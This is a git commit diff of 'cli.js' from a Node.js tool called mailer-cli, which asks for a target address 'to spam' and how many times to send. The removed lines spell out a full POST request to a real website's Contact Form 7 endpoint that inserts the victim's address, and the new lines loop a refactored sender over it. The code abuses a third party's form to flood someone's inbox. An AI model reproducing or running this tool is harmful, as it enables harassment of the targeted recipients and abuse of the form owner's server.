0a59fdf8c735e7598ff2806e71868b52c7ee2fc6
Rednexie <126991413+Rednexie@users.noreply.github.com>
2023-08-14 16:14:17 +0300

    Update cli.js

--- cli.js
+++ cli.js
@@ -2,8 +2,10 @@ const readline = require("readline")
 const consoled = require("consoled.js")
 const fetch = require("node-fetch") // npm i node-fetch@2.6.1
 const { times, delay } = require("./config.json").cli;
+const valid = require("./modules/valid")
+const sender = require("./modules/sender")
 
-
+let mail = "";
 
 function prompt(question, callback) {
   if (question === undefined) return false;
@@ -20,61 +22,33 @@ function prompt(question, callback) {
 }
 
 function callback(email) {
-  
-  if (/\S+@\S+\.\S+/.test(email) !== true) return consoled.bright.red("Invalid e-mail.")
-  for (let i = 0; i < number; i++) {
-    setInterval(() => {
-    fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/18514/feedback", {
-      "headers": {
-        "accept": "application/json, */*;q=0.1",
-        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-        "cache-control": "no-cache",
-        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKiovsaJILejIAeqg",
-        "pragma": "no-cache",
-        "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": "\"Windows\"",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin"
-      },
-      "referrer": "https://www.pardus.org.tr/en/home/",
-      "referrerPolicy": "strict-origin-when-cross-origin",
-      "body": "------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n18514\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_version\"\r\n\r\n5.7.7\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_locale\"\r\n\r\nen_US\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\nwpcf7-f18514-p18505-o1\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_container_post\"\r\n\r\n18505\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_posted_data_hash\"\r\n\r\n\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"e-mail\"\r\n\r\n" + email + "\r\n------WebKitFormBoundaryKiovsaJILejIAeqg--\r\n",
-      "method": "POST",
-      "mode": "cors",
-      "credentials": "include"
-    }).then(data => data.text()).then(data => {}).catch(err => consoled.fade.red(JSON.stringify(err)))
-    },delay)
-
+  if(valid(email.trim()) == false) {
+    consoled.bright.red("Please enter a valid e-mail.")
+    return prompt("Please enter an e-mail to spam", callback)
   }
-  fetch("https://www.pardus.org.tr/wp-json/contact-form-7/v1/contact-forms/18514/feedback", {
-      "headers": {
-        "accept": "application/json, */*;q=0.1",
-        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-        "cache-control": "no-cache",
-        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKiovsaJILejIAeqg",
-        "pragma": "no-cache",
-        "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": "\"Windows\"",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin"
-      },
-      "referrer": "https://www.pardus.org.tr/en/home/",
-      "referrerPolicy": "strict-origin-when-cross-origin",
-      "body": "------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n18514\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_version\"\r\n\r\n5.7.7\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_locale\"\r\n\r\nen_US\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\nwpcf7-f18514-p18505-o1\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_container_post\"\r\n\r\n18505\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"_wpcf7_posted_data_hash\"\r\n\r\n\r\n------WebKitFormBoundaryKiovsaJILejIAeqg\r\nContent-Disposition: form-data; name=\"e-mail\"\r\n\r\n" + email + "\r\n------WebKitFormBoundaryKiovsaJILejIAeqg--\r\n",
-      "method": "POST",
-      "mode": "cors",
-      "credentials": "include"
-    }).then(res => res.text()).then(data => console.log(data))
-  consoled.bright.green("Successfully sent " + number + " e-mails to: " + email)
-  prompt("Please enter an e-mail to spam", callback)
+  mail = email;
+  prompt("How much times do you want to send?", send)
+}
+
+function send(times){
+  if(isNaN(Number(times))){
+    consoled.bright.red("Please enter a valid number.")
+    return prompt("How much times do you want to send?", send)
+  }
+  if(Math.round((Number(times))) < 1){
+    consoled.bright.red("Please enter a positive number")
+    return prompt("How much times do you want to send?", send)
+  }
+  
+  for(let i = 0; i < times + 1; i++){
+    setTimeout(() => {
+      sender(mail);
+    },delay)
+  }
 }
 
 
 consoled.bright.blue("Welcome to mailer-cli <3");
 consoled.bright.magenta("https://github.com/Rednexie/mailer-cli");
 
-  prompt("Please enter an e-mail to spam", callback)
+  prompt("Please enter an e-mail to spam:", callback)
